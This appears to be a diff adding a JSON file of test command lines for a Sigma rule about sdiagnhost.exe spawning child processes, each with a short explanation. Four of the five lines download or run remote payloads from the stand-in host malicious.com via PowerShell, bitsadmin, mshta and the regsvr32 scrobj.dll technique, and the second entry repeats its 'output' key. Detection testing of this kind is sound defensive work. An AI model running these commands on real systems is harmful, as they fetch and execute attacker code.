@@ -1,0 +1,23 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\sdiagnhost.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noprofile -Command \"Invoke-WebRequest -Uri 'http://malicious.com/payload.ps1' -OutFile 'C:\\Temp\\payload.ps1'; . 'C:\\Temp\\payload.ps1'\"",
+    "explanation": "This command simulates a benign-looking execution of PowerShell by sdiagnhost.exe, which would trigger the Sigma rule. It uses a standard PowerShell command to download and execute a script, mimicking the behavior detected by the rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\sdiagnhost.exe C:\\Windows\\System32\\cmd.exe /c bitsadmin /transfer download /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+    "output": "C:\\Windows\\System32\\sdiagnhost.exe C:\\Windows\\System32\\cmd.exe /c bitsadmin /transfer download /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+    "explanation": "This command simulates a benign-looking execution of CMD by sdiagnhost.exe, which would trigger the Sigma rule. It uses the 'bitsadmin' utility to download a file, mimicking the behavior detected by the rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\sdiagnhost.exe C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL C:\\Temp\\malicious.cpl",
+    "explanation": "This command simulates a benign-looking execution of rundll32.exe by sdiagnhost.exe, which would trigger the Sigma rule. It uses a standard rundll32 invocation to load a control panel item, mimicking the behavior detected by the rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\sdiagnhost.exe C:\\Windows\\System32\\mshta.exe http://malicious.com/payload.hta",
+    "explanation": "This command simulates a benign-looking execution of mshta.exe by sdiagnhost.exe, which would trigger the Sigma rule. It uses a standard mshta invocation to execute a remote HTA file, mimicking the behavior detected by the rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\sdiagnhost.exe C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll",
+    "explanation": "This command simulates a benign-looking execution of regsvr32.exe by sdiagnhost.exe, which would trigger the Sigma rule. It uses a standard regsvr32 invocation to execute a remote SCT file, mimicking the behavior detected by the rule."
+  }
+]
